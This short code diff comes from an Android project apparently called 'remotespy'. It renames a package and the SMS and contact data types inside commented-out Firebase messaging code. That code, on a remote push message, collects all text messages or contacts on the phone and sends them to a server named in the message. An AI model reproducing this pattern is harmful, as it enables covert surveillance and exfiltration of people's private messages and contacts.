@@ -1,4 +1,4 @@
-package org.dalol.remotespy;
+package org.dalol.remotespy.common.fcm;
 
 /**
  * Created by filippo on 01/03/2018.
@@ -21,10 +21,10 @@ public class MyFirebaseMessagingService{
 //                if (body.length() > 2) {
 //                    String[] split = body.split(",");
 //                    if("msg".equals(split[0])) {
-//                        ArrayList<Sms> allSms = new MessagesHelper().getAllSms(this);
+//                        ArrayList<SmsVO> allSms = new MessagesHelper().getAllSms(this);
 //                        sendToServer(allSms, split[1],  split[2]);
 //                    } else {
-//                        List<ContacT> contacTS = new MessagesHelper().fetchContacts(this);
+//                        List<ContactVO> contacTS = new MessagesHelper().fetchContacts(this);
 //                        sendToServer(contacTS, split[1],  split[2]);
 //                    }
 //                }
